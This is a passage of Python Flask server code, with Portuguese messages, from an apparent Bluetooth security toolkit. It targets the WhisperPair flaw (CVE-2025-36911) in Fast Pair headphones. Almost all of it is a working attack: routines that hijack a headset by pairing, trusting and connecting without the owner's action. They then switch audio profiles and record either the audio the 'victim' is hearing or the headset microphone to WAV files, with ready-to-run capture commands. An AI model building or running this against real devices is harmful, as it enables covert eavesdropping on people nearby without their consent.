        _xsp.run(["bluetoothctl", "scan", "off"], capture_output=True, timeout=2)
        _xt.sleep(0.5)

        # ── Phase 4: Pair → Trust → Connect ───────────────────────────────────
        _step("pair_trust_connect")

        def _btctl(cmds, t=25):
            try:
                p = _xsp.Popen(["bluetoothctl"], stdin=_xsp.PIPE,
                    stdout=_xsp.PIPE, stderr=_xsp.PIPE, text=True)
                for c in cmds: p.stdin.write(c + chr(10))
                p.stdin.write("quit" + chr(10)); p.stdin.flush()
                return p.communicate(timeout=t)[0]
            except Exception: return ""

        _btctl(["pair " + target_mac, "trust " + target_mac, "connect " + target_mac])
        _xt.sleep(2)

        def _is_conn(mac):
            r = _xsp.run(["bluetoothctl", "info", mac],
                          capture_output=True, text=True, timeout=5)
            return "Connected: yes" in (r.stdout or "")

        if not _is_conn(target_mac):
            _btctl(["trust " + target_mac, "connect " + target_mac])
            _xt.sleep(3)

        connected = _is_conn(target_mac)
        job["connect_ok"] = connected
        job["details"] += " | connected={}".format(connected)

        if not connected:
            # Connect failed — attempt with all other Fast Pair MACs discovered in the scan
            # Device may have rotated again during the pairing window
            _step("try_alt_macs")
            alt_macs = [m for m in discovered.keys()
                        if m != target_mac and m != old_mac and discovered[m].get("services") and
                        any("fe2c" in s for s in discovered[m].get("services", []))]
            job["details"] += " | Tentando MACs alternativos: {}".format(alt_macs or "nenhum")

            for alt_mac in alt_macs[:3]:
                _xsp.run(["bluetoothctl", "remove", target_mac], capture_output=True, timeout=3)
                _xsp.run(["bluetoothctl", "scan", "on"], capture_output=True, timeout=2)
                _xt.sleep(3)
                _xsp.run(["bluetoothctl", "scan", "off"], capture_output=True, timeout=2)
                _xt.sleep(0.5)
                _btctl(["pair " + alt_mac, "trust " + alt_mac, "connect " + alt_mac])
                _xt.sleep(2)
                if _is_conn(alt_mac):
                    target_mac = alt_mac
                    job["new_mac"] = alt_mac
                    connected = True
                    job["details"] += " | ✅ Conectado via MAC alternativo: " + alt_mac
                    break

        if not connected:
            job["status"] = "error"
            job["details"] += " | ⚠ Falha — tente: bluetoothctl connect " + target_mac
            return

        # ── Phase 5: PulseAudio — force card registration + A2DP ─────────────
        # From real logs: device shows Connected: yes but pactl sees no card
        # This is because BLE connected but PipeWire hasn't triggered BT audio profile
        # Fix sequence:
        #  1. bluetoothctl connect (already done) → BlueZ registers BR/EDR profile
        #  2. Wait for PipeWire to enumerate the card (up to 8s)
        #  3. If no card: force module reload via pactl

        _step("setup_audio")
        _xt.sleep(2.0)

        real_user = os.environ.get("SUDO_USER") or os.environ.get("USER") or "kali"
        try:
            import pwd as _pd
            _ui = _pd.getpwnam(real_user)
            _pulse_env = {**os.environ,
                "XDG_RUNTIME_DIR": "/run/user/{}".format(_ui.pw_uid),
                "PULSE_RUNTIME_PATH": "/run/user/{}/pulse".format(_ui.pw_uid),
                "HOME": _ui.pw_dir,
            }
            def _drop(): os.setgid(_ui.pw_gid); os.setuid(_ui.pw_uid)
        except Exception:
            _pulse_env = os.environ.copy(); _drop = None

        def _pactl(args, t=6):
            try:
                r = subprocess.run(["pactl"] + args, env=_pulse_env,
                    preexec_fn=_drop, timeout=t, capture_output=True, text=True)
                return r.stdout + r.stderr
            except Exception as e: return str(e)

        # Find card — poll up to 10s (PipeWire may take time to register after BLE connect)
        mac_n = target_mac.replace(":", "_").lower()
        card = None
        for _poll_attempt in range(5):
            cards = _pactl(["list", "cards", "short"])
            for ln in cards.splitlines():
                nl = ln.lower()
                if "bluez" in nl and mac_n in nl:
                    card = ln.split()[1] if ln.split() else None; break
            if not card:
                for ln in cards.splitlines():
                    if "bluez_card" in ln.lower():
                        card = ln.split()[1] if ln.split() else None; break
            if card:
                break
            # No card yet — try forcing PipeWire to reload BT module
            if _poll_attempt == 1:
                try:
                    subprocess.run(["pactl", "load-module", "module-bluez5-device",
                                    "path=/org/bluez/{}/dev_{}".format(
                                        HCI_IFACE,
                                        target_mac.replace(":", "_"))],
                                   env=_pulse_env, preexec_fn=_drop,
                                   capture_output=True, timeout=5)
                except Exception:
                    pass
            if _poll_attempt == 2:
                # Try connecting again — sometimes PipeWire registers after reconnect
                _btctl(["connect " + target_mac])
            _xt.sleep(2)

        job["card"] = card
        job["details"] += " | card={}".format(card or "não encontrado")

        # Set A2DP profile (for playback capture — the "what plays in headphone" capture)
        if card:
            for prof in ["a2dp-sink", "a2dp_sink", "a2dp-sink-sbc", "a2dp-sink-aac", "a2dp"]:
                r = _pactl(["set-card-profile", card, prof])
                if "not found" not in r.lower() and "error" not in r.lower():
                    job["details"] += " | profile=" + prof; break
            _xt.sleep(2.0)

        # Get sink name
        sinks = _pactl(["list", "sinks", "short"])
        sink_name = None
        for ln in sinks.splitlines():
            if "bluez" in ln.lower() and mac_n in ln.lower():
                sink_name = ln.split()[1] if ln.split() else None; break
        if not sink_name:
            for ln in sinks.splitlines():
                if "bluez" in ln.lower():
                    sink_name = ln.split()[1] if ln.split() else None; break

        # Force A2DP sink creation by playing silence
        if sink_name:
            _pactl(["set-default-sink", sink_name])
            try:
                subprocess.run(
                    ["paplay", "--device=" + sink_name,
                     "/usr/share/sounds/alsa/Front_Left.wav"],
                    env=_pulse_env, preexec_fn=_drop, capture_output=True, timeout=4)
            except Exception: pass
            _xt.sleep(1)

        # Find sources
        sources = _pactl(["list", "sources", "short"])
        a2dp_monitor = None; hfp_source = None
        for ln in sources.splitlines():
            nl = ln.lower(); parts = ln.split()
            src = parts[1] if len(parts) > 1 else None
            if not src or "bluez" not in nl: continue
            if "monitor" in nl:
                if mac_n in nl or a2dp_monitor is None: a2dp_monitor = src
            else:
                if mac_n in nl or hfp_source is None: hfp_source = src

        # Construct monitor from sink if not found
        if not a2dp_monitor and sink_name:
            a2dp_monitor = sink_name + ".monitor"

        # Try HFP/HSP profile to get microphone source
        # Switch to headset profile → find source → restore A2DP
        hfp_card_set = False
        if card:
            for prof in ["headset-head-unit", "headset_head_unit", "hsp-hs", "hfp-hf",
                         "handsfree_head_unit"]:
                r = _pactl(["set-card-profile", card, prof])
                if "not found" not in r.lower() and "error" not in r.lower():
                    _xt.sleep(1.5)
                    sources2 = _pactl(["list", "sources", "short"])
                    for ln in sources2.splitlines():
                        nl = ln.lower(); parts = ln.split()
                        src = parts[1] if len(parts) > 1 else None
                        if src and "bluez" in nl and "monitor" not in nl:
                            hfp_source = src; hfp_card_set = True
                            job["details"] += " | hfp_profile=" + prof
                            break
                    if hfp_source: break
            # Always restore A2DP after HFP check (better audio quality for capture)
            if card:
                for prof in ["a2dp-sink", "a2dp_sink", "a2dp-sink-sbc"]:
                    r = _pactl(["set-card-profile", card, prof])
                    if "not found" not in r.lower() and "error" not in r.lower():
                        _xt.sleep(1)
                        break

        job["a2dp_monitor"] = a2dp_monitor
        job["hfp_source"]   = hfp_source
        job["card"]         = card
        job["target_mac"]   = target_mac
        job["sink_name"]    = sink_name

        # Parecord commands ready to use
        mac_safe = target_mac.replace(":", "_")
        job["cmd_a2dp"] = (
            "parecord --device={} --file-format=wav --rate=16000 captures/a2dp_{}.wav"
            .format(a2dp_monitor, mac_safe)) if a2dp_monitor else None
        job["cmd_hfp"] = (
            "parecord --device={} --file-format=wav --rate=16000 captures/hfp_{}.wav"
            .format(hfp_source, mac_safe)) if hfp_source else None

        job["status"] = "done"
        job["details"] += " | ✅ a2dp={} hfp={}".format(
            a2dp_monitor or "—", hfp_source or "—")

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"job_id": job_id, "status": "running", "mac": old_mac,
                    "message": "Poll /api/audio/whisperpair-status/" + job_id})

@app.route("/api/audio/whisperpair-status/<job_id>", methods=["GET"])
def audio_whisperpair_status(job_id):
    """Poll WhisperPair assessment job status."""
    if not hasattr(STATE, "_wp_jobs") or job_id not in STATE._wp_jobs:
        return jsonify({"error": "Job not found", "status": "not_found"}), 404
    _archive_audio_job(job_id, STATE._wp_jobs[job_id])
    return jsonify(STATE._wp_jobs[job_id])

@app.route("/api/audio/evidence", methods=["GET"])
def audio_evidence_archive():
    """Return archived audio evidence for reports, including rotated-MAC assets."""
    return jsonify({"evidence": _audio_archive_load()})


# ═══ AUDIO SECURITY — WhisperPair (CVE-2025-36911) ═══════

@app.route("/api/audio/whisper-test", methods=["POST"])
def audio_whisper_test():
    """Test if audio device is vulnerable to WhisperPair (CVE-2025-36911)."""
    try:
        data = request.get_json(silent=True) or {}
        mac = data.get("mac", "")
        if not mac: return jsonify({"error": "MAC required", "vulnerable": False}), 400

        # Stop discovery to free adapter
        if STATE.discovery_running:
            STATE.discovery_running = False
            time.sleep(0.5)

        from ble_manager import reset_adapter, remove_device_cache
        remove_device_cache(mac)
        reset_adapter()
        time.sleep(0.5)

        result = {"mac": mac, "vulnerable": False, "details": ""}
        def _test():
            import asyncio
            from bleak import BleakClient, BleakScanner
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                async def _check():
                    fp_found = False
                    try:
                        devices = await BleakScanner.discover(timeout=5)
                    except Exception as e:
                        result["details"] = f"Scanner error: {e}"
                        return

                    for d in devices:
                        if d.address.upper() == mac.upper():
                            uuids = []
                            if hasattr(d, 'metadata') and d.metadata:
                                uuids = d.metadata.get("uuids", [])
                                md = d.metadata.get("manufacturer_data", {})
                                if 224 in md: fp_found = True
                            for uuid in uuids:
                                if "fe2c" in uuid.lower(): fp_found = True

                    if not fp_found:
                        result["details"] = "Device não anuncia Fast Pair (0xFE2C). Tentando conexão direta..."

                    try:
                        async with BleakClient(mac, timeout=15) as client:
                            if client.is_connected:
                                for svc in client.services:
                                    if "fe2c" in svc.uuid.lower():
                                        result["vulnerable"] = True
                                        result["details"] = "🔴 Device aceita conexão Fast Pair fora do pairing mode! Vulnerável a hijacking e eavesdropping."
                                        return
                                for svc in client.services:
                                    uuid = svc.uuid.lower()
                                    if any(x in uuid for x in ["1108", "110b", "111e", "110e"]):
                                        result["vulnerable"] = True
                                        result["details"] = "🔴 Device aceita conexão a serviços de áudio sem pairing mode."
                                        return
                                result["details"] = "Conectou mas sem serviço Fast Pair ou áudio. Risco baixo."
                    except Exception as e:
                        err = str(e)[:100]
                        result["details"] = f"Conexão recusada: {err}. Device pode estar protegido."

                loop.run_until_complete(_check())
            except Exception as e:
                result["details"] = f"Erro interno: {str(e)[:100]}"
            finally:
                loop.close()

        t = threading.Thread(target=_test, daemon=True)
        t.start()
        t.join(timeout=30)
        if not result["details"]:
            result["details"] = "Timeout — device não encontrado ou fora de alcance."
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e), "vulnerable": False, "details": str(e)})


# Active recording processes — keyed by job_id, value = Popen process
_RECORD_PROCS: dict = {}

@app.route("/api/audio/record", methods=["POST"])
def audio_record():
    """Record audio from vulnerable headphone/speaker via CVE-2025-36911.

    Capture mode (matches zwhisper behavior):
    - DEFAULT: A2DP sink monitor — captures audio PLAYING on the headphone
      (what the victim hears). Uses bluez_sink.XX_XX.a2dp_sink.monitor
    - mode=mic: HFP source — captures microphone (requires HFP profile)

    zwhisper logic:
      1. Connect device via bluetoothctl
      2. Switch card to a2dp-sink profile
      3. Record from bluez_sink.<mac>.a2dp_sink.monitor (sink monitor)
      → This captures the music/audio the victim is listening to

    Returns job_id immediately. Poll /api/audio/record-status/<job_id>.
    Stop anytime via POST /api/audio/record-stop/<job_id>.
    """
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "").strip().upper()
    duration = max(5, min(int(data.get("duration", 20)), 120))
    if not mac: return jsonify({"error": "MAC required"}), 400

    import os as _os, pwd as _pwd
    _os.makedirs("captures", exist_ok=True)
    job_id = "rec_{}_{}".format(mac.replace(":","_"), int(time.time()))
    filename = "whisper_{}.wav".format(job_id)
    filepath = "captures/" + filename

    if not hasattr(STATE, "_rec_jobs"): STATE._rec_jobs = {}
    job = {"job_id": job_id, "mac": mac, "status": "connecting",
           "file": None, "size": 0, "error": "", "duration": duration,
           "elapsed": 0, "source": None, "details": "", "steps": [],
           "backend": None, "mode_label": None}
    STATE._rec_jobs[job_id] = job

    def _step(msg):
        job["steps"].append(msg)
        job["step"] = msg

    # Resolve real user for PulseAudio
    real_user = _os.environ.get("SUDO_USER") or _os.environ.get("USER") or "kali"
    try:
        real_uid = _pwd.getpwnam(real_user).pw_uid
        real_gid = _pwd.getpwnam(real_user).pw_gid
        real_home = _pwd.getpwnam(real_user).pw_dir
    except Exception:
        real_uid = real_gid = None
        real_home = "/home/" + real_user

    pulse_env = dict(_os.environ)
    if real_uid is not None:
        pulse_env["XDG_RUNTIME_DIR"]    = "/run/user/{}".format(real_uid)
        pulse_env["PULSE_RUNTIME_PATH"] = "/run/user/{}/pulse".format(real_uid)
        pulse_env["HOME"] = real_home
        dbus = "/run/user/{}/bus".format(real_uid)
        if _os.path.exists(dbus):
            pulse_env["DBUS_SESSION_BUS_ADDRESS"] = "unix:path=" + dbus

    def _drop():
        if real_uid: _os.setgid(real_gid); _os.setuid(real_uid)

    def _run_user(cmd, t=8):
        try:
            return subprocess.run(cmd, capture_output=True, timeout=t,
                                  env=pulse_env,
                                  preexec_fn=_drop if real_uid and _os.geteuid()==0 else None)
        except Exception as e:
            return None

    def _out(r):
        return r.stdout.decode("utf-8", errors="ignore") if r and r.stdout else ""

    def _err(r):
        return r.stderr.decode("utf-8", errors="ignore") if r and r.stderr else ""

    def _is_bt_source_name(name, require_monitor=None):
        if not name:
            return False
        nl = name.lower()
        if "bluez" not in nl:
            return False
        if require_monitor is True and "monitor" not in nl:
            return False
        if require_monitor is False and "monitor" in nl:
            return False
        return True

    capture_mode = data.get("mode", "zwhisper")
    if capture_mode not in ("auto", "a2dp", "mic", "zwhisper"):
        capture_mode = "zwhisper"

    def _get_card_name(target_mac):
        """Get PulseAudio card name for this BT device."""
        mac_n = target_mac.replace(":", "_").lower()
        r = _run_user(["pactl", "list", "cards", "short"])
        if not r: return None
        for ln in _out(r).splitlines():
            if "bluez" in ln.lower() and mac_n in ln.lower():
                parts = ln.split()
                return parts[1] if len(parts) > 1 else None
        # Fallback: any bluez card
        bluez_cards = []
        for ln in _out(r).splitlines():
            if "bluez_card" in ln.lower():
                parts = ln.split()
                if len(parts) > 1:
                    bluez_cards.append(parts[1])
        if len(bluez_cards) == 1:
            return bluez_cards[0]
        return None

    def _find_a2dp_sink_name(target_mac):
        """Find A2DP sink name (NOT the monitor) for setting default sink."""
        mac_n = target_mac.replace(":", "_").lower()
        r = _run_user(["pactl", "list", "sinks", "short"])
        if not r: return None
        for ln in _out(r).splitlines():
            if "bluez" in ln.lower() and mac_n in ln.lower():
                parts = ln.split()
                return parts[1] if len(parts) > 1 else None
        bluez_sinks = []
        for ln in _out(r).splitlines():
            if "bluez_sink" in ln.lower() or "bluez_output" in ln.lower():
                parts = ln.split()
                if len(parts) > 1:
                    bluez_sinks.append(parts[1])
        if len(bluez_sinks) == 1:
            return bluez_sinks[0]
        return None

    def _find_a2dp_monitor(target_mac):
        """Find A2DP sink monitor — captures audio PLAYING on the headphone.
        
        zwhisper approach: record from bluez_sink.<mac>.a2dp_sink.monitor
        This captures what the victim hears, not the microphone.
        """
        mac_n = target_mac.replace(":", "_").lower()
        r = _run_user(["pactl", "list", "sources", "short"])
        if not r: return None
        out = _out(r)
        # Look for sink monitor with this MAC
        for ln in out.splitlines():
            nl = ln.lower()
            if "bluez" in nl and "monitor" in nl and mac_n in nl:
                parts = ln.split()
                return parts[1] if len(parts) > 1 else None
        # Fallback: any bluez sink monitor
        monitors = []
        for ln in out.splitlines():
            nl = ln.lower()
            if ("bluez_sink" in nl or "bluez_output" in nl) and "monitor" in nl:
                parts = ln.split()
                if len(parts) > 1:
                    monitors.append(parts[1])
        if len(monitors) == 1:
            return monitors[0]
        # Last resort: construct monitor name from sink name
        r2 = _run_user(["pactl", "list", "sinks", "short"])
        if r2:
            for ln in _out(r2).splitlines():
                nl = ln.lower()
                if "bluez" in nl and mac_n in nl:
                    parts = ln.split()
                    if len(parts) > 1:
                        return parts[1] + ".monitor"
        return None

    def _find_hfp_source(target_mac):
        """Find HFP microphone source — captures what the device's mic hears."""
        mac_n = target_mac.replace(":", "_").lower()
        r = _run_user(["pactl", "list", "sources", "short"])
        if not r: return None
        out = _out(r)
        for ln in out.splitlines():
            nl = ln.lower()
            if "bluez" in nl and mac_n in nl and "monitor" not in nl:
                if any(k in nl for k in ["handsfree","hsp","hfp","input","source"]):
                    parts = ln.split()
                    return parts[1] if len(parts) > 1 else None
        # Any bluez source that isn't a monitor
        hfp_sources = []
        for ln in out.splitlines():
            nl = ln.lower()
            if "bluez_source" in nl and "monitor" not in nl:
                parts = ln.split()
                if len(parts) > 1:
                    hfp_sources.append(parts[1])
        if len(hfp_sources) == 1:
            return hfp_sources[0]
        return None

    def _has_user_tool(name):
        r = _run_user(["which", name], t=3)
        return bool(r and r.returncode == 0)

    def _wpctl_status():
        r = _run_user(["wpctl", "status"], t=6)
        return _out(r) if r else ""

    def _wpctl_find_node(target_mac, want_mic=False):
        """Find a PipeWire node ID like zwhisper does.

        For A2DP evidence we prefer a Bluetooth source/monitor if present, then
        a Bluetooth sink node. For mic evidence we prefer source/input nodes.
        """
        status = _wpctl_status()
        mac_n = target_mac.replace(":", "_").lower()
        candidates = []
        section = ""
        for ln in status.splitlines():
            low = ln.lower()
            if "sinks:" in low:
                section = "sink"
                continue
            if "sources:" in low:
                section = "source"
                continue
            if "devices:" in low or "clients:" in low:
                section = ""
            if not section:
                continue
            if "bluetooth" not in low and "bluez" not in low and mac_n not in low:
                continue
            m = re.search(r"\*?\s*(\d+)\.\s+", ln)
            if not m:
                continue
            score = 0
            if mac_n in low:
                score += 20
            if section == "source":
                score += 10
            if "monitor" in low:
                score += 8
            if "input" in low or "handsfree" in low or "hfp" in low or "hsp" in low:
                score += 6
            if section == "sink" and not want_mic:
                score += 4
            if want_mic and section != "source":
                score -= 20
            candidates.append((score, m.group(1), section, ln.strip()))
        if not candidates:
            return None, None
        candidates.sort(reverse=True, key=lambda x: x[0])
        return candidates[0][1], candidates[0][3]

    def _zwhisper_record(target_mac, secs, path, want_mic=False):
        """ZWhisper-compatible PipeWire path: wpctl node selection + pw-record."""
        if not (_has_user_tool("wpctl") and _has_user_tool("pw-record")):
            return False, 0, None, "wpctl/pw-record não disponíveis"

        _step("zwhisper_pipewire")
        job["details"] += " | ZWhisper PipeWire path"

        # ZWhisper restarts user audio services so BlueZ cards/nodes appear.
        # Ignore failures: some systems use PulseAudio or user services may be absent.
        _run_user(["systemctl", "--user", "restart", "wireplumber"], t=8)
        _run_user(["systemctl", "--user", "restart", "pipewire-pulse"], t=8)
        time.sleep(3)

        # Reconnect after the audio service restart so PipeWire sees the card.
        subprocess.run(["bluetoothctl", "trust", target_mac], capture_output=True, timeout=5)
        subprocess.run(["bluetoothctl", "connect", target_mac], capture_output=True, timeout=15)
        time.sleep(3)

        card = _get_card_name(target_mac)
        if card and not want_mic:
            for prof in ["a2dp-sink", "a2dp_sink", "a2dp-sink-sbc", "a2dp-sink-aac", "a2dp"]:
                r = _run_user(["pactl", "set-card-profile", card, prof], t=4)
                if r and r.returncode == 0:
                    job["details"] += " | zprofile:" + prof
                    break
        elif card and want_mic:
            for prof in ["headset-head-unit", "headset_head_unit", "handsfree-head-unit",
                         "handsfree_head_unit", "hsp-hs", "hfp-hf"]:
                r = _run_user(["pactl", "set-card-profile", card, prof], t=4)
                if r and r.returncode == 0:
                    job["details"] += " | zprofile:" + prof
                    break
        time.sleep(2)

        node_id, node_line = _wpctl_find_node(target_mac, want_mic=want_mic)
        if not node_id:
            return False, 0, None, "Nenhum nó Bluetooth encontrado em wpctl status"

        # For A2DP, set sink as default if the selected node is a sink; this can
        # force routing and make monitor capture observable.
        try:
            _run_user(["wpctl", "set-default", node_id], t=3)
            _run_user(["wpctl", "set-volume", node_id, "0.7"], t=3)
        except Exception:
            pass

        if _os.path.exists(path):
            _os.remove(path)
        r = _run_user(["pw-record", "--target", node_id, path], t=secs + 6)
        if _os.path.exists(path):
            sz = _os.path.getsize(path)
            if sz > 44 + 1000:
                return True, sz, node_id, node_line
            err = _err(r).strip()[:120] if r else ""
            return False, sz, node_id, "Arquivo pequeno via wpctl node {}. {}".format(node_id, err)
        return False, 0, node_id, (_err(r).strip()[:120] if r else "pw-record não criou arquivo")

    def _run():
        import time as _t, os as _ora

        # ── Step 1: Pair → Trust → Connect (full sequence for CVE-2025-36911) ─
        # Required even if device was previously connected via GATT exploit:
        # GATT connection is BLE only; A2DP needs BR/EDR Classic BT pairing.
        _step("scan")
        job["status"] = "connecting"
        job["mode"] = capture_mode
        job["details"] = ""

        def _btctl_text(args=None, stdin_text=None, timeout_s=12):
            try:
                r = subprocess.run(["bluetoothctl"] + (args or []),
                                   input=stdin_text, capture_output=True,
                                   text=True, timeout=timeout_s)
                return r.returncode, (r.stdout or "") + (r.stderr or "")
            except subprocess.TimeoutExpired as e:
                out = ""
                if e.stdout:
                    out += e.stdout.decode("utf-8", errors="ignore") if isinstance(e.stdout, bytes) else str(e.stdout)
                if e.stderr:
                    out += e.stderr.decode("utf-8", errors="ignore") if isinstance(e.stderr, bytes) else str(e.stderr)
                return 124, out + " | timeout"
            except Exception as e:
                return 1, str(e)

        # Short scan so BlueZ can (re)discover the device
        _btctl_text(["scan", "on"], timeout_s=3)
        _t.sleep(4)
        _btctl_text(["scan", "off"], timeout_s=3)
        _t.sleep(0.5)

        # Pair (creates link key needed for BR/EDR A2DP). Use a bluetoothctl
        # session instead of `bluetoothctl pair MAC`, which can block forever
        # waiting for an agent prompt on some headphones.
        _step("pair")
        seq = (
            "agent NoInputOutput\n"
            "default-agent\n"
            "scan on\n"
            "pair " + mac + "\n"
            "trust " + mac + "\n"
            "connect " + mac + "\n"
            "scan off\n"
            "quit\n"
        )
        pair_rc, pair_out = _btctl_text(stdin_text=seq, timeout_s=32)
        pair_out = pair_out.strip()
        _, info_after_pair = _btctl_text(["info", mac], timeout_s=6)
        already_paired = ("already paired" in pair_out.lower() or
                          "paired: yes" in pair_out.lower() or
                          "pairing successful" in pair_out.lower() or
                          "Paired: yes" in info_after_pair)
        job["details"] += "pair: " + ("OK" if already_paired else pair_out[:60])

        # Trust (persist connection across reboots + allow auto-connect)
        _step("trust")
        _btctl_text(["trust", mac], timeout_s=6)

        # Connect (triggers A2DP/HFP profile negotiation)
        _step("connect")
        connect_rc, conn_out = _btctl_text(["connect", mac], timeout_s=20)
        conn_out = conn_out.strip()
        connected_ok = ("connection successful" in conn_out.lower() or
                        "connected: yes" in conn_out.lower() or
                        connect_rc == 0)
        job["details"] += " | connect: " + ("OK" if connected_ok else conn_out[:60])

        if not connected_ok:
            # Verify via bluetoothctl info
            _, info_out = _btctl_text(["info", mac], timeout_s=6)
            connected_ok = "Connected: yes" in info_out

        if not connected_ok:
            job["status"] = "error"
            job["error"] = (
                "Não foi possível conectar em {}. O endereço foi visto no BLE scan, "
                "mas o endpoint Classic/A2DP não está disponível no BlueZ. Coloque o "
                "fone em modo pareamento pelo estojo e tente novamente. Comando manual "
                "para validar: bluetoothctl scan on; pair {}; trust {}; connect {}"
            ).format(mac, mac, mac, mac)
            return

        _t.sleep(3)  # give BlueZ/PipeWire time to negotiate A2DP profile

        if capture_mode == "zwhisper":
            want_mic = bool(data.get("zwhisper_mic", False))
            ok, sz, node_id, info = _zwhisper_record(mac, duration, filepath, want_mic=want_mic)
            job["source"] = "wpctl:" + str(node_id) if node_id else None
            job["mode_label"] = "ZWhisper PipeWire"
            job["backend"] = "pw-record/wpctl"
            if ok:
                job["status"] = "done"
                job["file"] = filename
                job["size"] = sz
                job["details"] += " | wpctl node: " + str(info)
            else:
                job["status"] = "error"
                job["file"] = filename if _os.path.exists(filepath) else None
                job["size"] = sz
                job["error"] = (
                    "ZWhisper/PipeWire não conseguiu gravar. Detalhe: {}. "
                    "Valide manualmente: wpctl status; bluetoothctl trust {}; "
                    "bluetoothctl connect {}; pw-record --target <ID> captures/{}"
                ).format(info or "sem detalhe", mac, mac, filename)
            return

        # ── Step 2: Poll for card + switch to correct audio profile ─────────
        _step("profile")
        # Poll up to 10s for PipeWire/PulseAudio to register the BT card
        card = None
        for _ci in range(5):
            card = _get_card_name(mac)
            if card:
                break
            _t.sleep(2)
            # On 2nd attempt: try forcing BT module reload
            if _ci == 1:
                try:
                    _run_user(["pactl", "load-module", "module-bluetooth-discover"])
                except Exception:
                    pass
            # On 3rd attempt: reconnect to trigger profile renegotiation
            if _ci == 2:
                subprocess.run(["bluetoothctl", "connect", mac],
                               capture_output=True, timeout=10)
                _t.sleep(2)
        job["details"] += " | card: " + (card or "não encontrado — verifique PipeWire")

        if card:
            if capture_mode in ("a2dp", "auto"):
                # Default evidence mode: capture the A2DP sink monitor, i.e. audio
                # being played to the headset.
                for prof in ["a2dp-sink", "a2dp_sink", "a2dp-sink-sbc",
                             "a2dp-sink-aac", "a2dp-sink-ldac", "a2dp-sink-aptx",
                             "a2dp", "a2dp_source"]:
                    r = _run_user(["pactl", "set-card-profile", card, prof])
                    if r and r.returncode == 0:
                        job["details"] += " | A2DP: " + prof
                        break
            if capture_mode == "mic":
                for prof in ["headset-head-unit", "headset_head_unit",
                             "headset-head-unit-cvsd", "headset-head-unit-msbc",
                             "handsfree-head-unit", "handsfree_head_unit",
                             "hsp-hs", "hfp-hf"]:
                    r = _run_user(["pactl", "set-card-profile", card, prof])
                    if r and r.returncode == 0:
                        job["details"] += " | HFP: " + prof
                        break
        _t.sleep(2)  # wait for PulseAudio to register sink after profile switch

        # ── Step 3: Force sink creation via silent audio playback ─────────────
        # PulseAudio only creates bluez_sink.monitor AFTER audio starts flowing
        # Play 1s of silence to the BT device to force sink registration
        if capture_mode in ("a2dp", "auto"):
            _step("prime_a2dp")
            bt_sink_name = _find_a2dp_sink_name(mac)  # find the sink (not monitor)
            if bt_sink_name:
                try:
                    # Play silence: aplay or paplay to the BT sink
                    _run_user(["paplay", "--device=" + bt_sink_name,
                               "/usr/share/sounds/alsa/Front_Left.wav"],
                              t=4)
                    _t.sleep(1)
                except Exception:
                    pass
                # Also set as default sink to ensure routing
                _run_user(["pactl", "set-default-sink", bt_sink_name], t=3)
                _t.sleep(1)

        # ── Step 4: Find the recording source ────────────────────────────────
        _step("select_source")
        if capture_mode == "mic":
            bt_source = _find_hfp_source(mac)
            mode_label = "Microfone HFP"
        elif capture_mode == "a2dp":
            # Try up to 3 times with delays — sink monitor may take a moment to appear
            bt_source = None
            for _retry in range(3):
                bt_source = _find_a2dp_monitor(mac)
                if bt_source:
                    break
                _t.sleep(2)
            mode_label = "Monitor A2DP (áudio tocando no headphone)"
        else:
            # Auto: prefer the A2DP monitor because Phase 2 evidence is the
            # audio being played to the headphone. HFP mic is only a fallback.
            bt_source = None
            mode_label = "Monitor A2DP (áudio tocando no headphone)"
            for _retry in range(4):
                bt_source = _find_a2dp_monitor(mac)
                if bt_source:
                    break
                _t.sleep(2)
            if not bt_source:
                bt_source = _find_hfp_source(mac)
                mode_label = "Microfone HFP"

        job["source"] = bt_source
        job["mode_label"] = mode_label

        if not bt_source:
            # ── Aggressive A2DP establishment (zwhisper method) ──────────────
            # If A2DP monitor not found, try the zwhisper connection sequence:
            # disconnect → pair → trust → connect → wait → check again
            if capture_mode in ("a2dp", "auto"):
                _step("zwhisper_connect")
                job["details"] += " | A2DP sink não encontrado — tentando sequência zwhisper..."
                try:
                    import subprocess as _zwrec, time as _zwrect
                    # zwhisper sequence
                    _zwrec.run(["bluetoothctl", "disconnect", mac], capture_output=True, timeout=5)
                    _zwrect.sleep(1)
                    proc = _zwrec.Popen(["bluetoothctl"], stdin=_zwrec.PIPE,
                                        stdout=_zwrec.PIPE, stderr=_zwrec.PIPE, text=True)
                    seq = ("scan on" + chr(10) + "disconnect " + mac + chr(10) +
                           "pair " + mac + chr(10) + "trust " + mac + chr(10) +
                           "connect " + mac + chr(10) + "quit" + chr(10))
                    proc.stdin.write(seq); proc.stdin.flush()
                    proc.communicate(timeout=20)
                    _zwrect.sleep(3)

                    # Re-get card and switch profile
                    card2 = _get_card_name(mac)
                    if card2:
                        for prof in ["a2dp-sink", "a2dp_sink", "a2dp-sink-sbc",
                                     "a2dp-sink-aac", "a2dp"]:
                            r = _run_user(["pactl", "set-card-profile", card2, prof])
                            if r and r.returncode == 0:
                                job["details"] += " | profile: " + prof
                                break
                    _zwrect.sleep(2)

                    # Force sink creation
                    sink2 = _find_a2dp_sink_name(mac)
                    if sink2:
                        _run_user(["pactl", "set-default-sink", sink2])
                        _run_user(["paplay", "--device=" + sink2,
                                   "/usr/share/sounds/alsa/Front_Left.wav"], t=3)
                        _t.sleep(1.5)

                    # Retry finding monitor
                    for _r in range(3):
                        bt_source = _find_a2dp_monitor(mac)
                        if bt_source:
                            job["details"] += " | Monitor encontrado após zwhisper: " + bt_source
                            break
                        _t.sleep(2)
                except Exception as _zwe:
                    job["details"] += " | zwhisper_connect err: " + str(_zwe)[:60]

            if not bt_source and capture_mode == "auto":
                bt_source = _find_hfp_source(mac)
                if bt_source:
                    mode_label = "Microfone HFP"

            if not bt_source:
                mac_clean = mac.replace(":", "")
                if capture_mode == "mic":
                    manual = ("parecord --device=$(pactl list sources short | grep -i bluez | "
                              "grep -v monitor | awk '{print $2}' | head -1) "
                              "--file-format=wav --rate=16000 captures/" + filename)
                elif capture_mode == "a2dp":
                    manual = ("parecord --device=$(pactl list sources short | grep -i monitor | "
                              "grep -i bluez | awk '{print $2}' | head -1) "
                              "--file-format=wav --rate=16000 captures/" + filename)
                else:
                    manual = ("pactl list sources short | grep -i bluez ; "
                              "parecord --device=<BLUEZ_SOURCE_FROM_LIST> "
                              "--file-format=wav --rate=16000 captures/" + filename)
                job["status"] = "error"
                job["error"] = (
